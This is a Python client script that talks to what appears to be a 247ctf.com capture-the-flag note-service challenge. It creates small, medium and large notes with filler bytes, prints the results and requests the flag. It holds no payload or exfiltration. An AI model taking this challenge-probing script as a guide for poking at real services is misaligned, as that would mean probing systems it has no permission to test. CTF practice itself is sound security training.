#!/usr/bin/env python3
import socket, time

def recv_until(sock, token: bytes, timeout=8.0):
    sock.settimeout(0.5)
    end = time.time()+timeout
    buf = bytearray()
    while time.time()<end:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            chunk=b''
        if chunk:
            buf+=chunk
            if token in buf:
                return bytes(buf)
        else:
            time.sleep(0.05)
    return bytes(buf)

def sendline(sock, s: str):
    sock.sendall(s.encode()+b"\n")

def make(sock, kind: str, data: bytes):
    sendline(sock, kind)
    recv_until(sock, f"Enter the size of your {kind} note:".encode())
    sendline(sock, str(len(data)))
    recv_until(sock, f"Enter {kind} note data:".encode())
    sock.sendall(data)
    recv_until(sock, b"Enter command:")


def main():
    host,port = 'e9ea7c6b519c45be.247ctf.com', 50188
    s = socket.create_connection((host,port), timeout=6)
    recv_until(s, b"Enter command:")

    make(s, 'small',  b'A'*8)
    make(s, 'medium', b'B'*8)
    out1 = None
    sendline(s, 'print')
    out1 = recv_until(s, b"Enter command:").decode(errors='replace')
    print('--- After medium ---')
    print(out1)

    make(s, 'large',  b'C'*8)
    sendline(s, 'print')
    out2 = recv_until(s, b"Enter command:").decode(errors='replace')
    print('--- After large ---')
    print(out2)

    sendline(s, 'flag')
    flag = recv_until(s, b"Enter command:").decode(errors='replace')
    print('--- Flag ---')
    print(flag)

if __name__=='__main__':
    main()
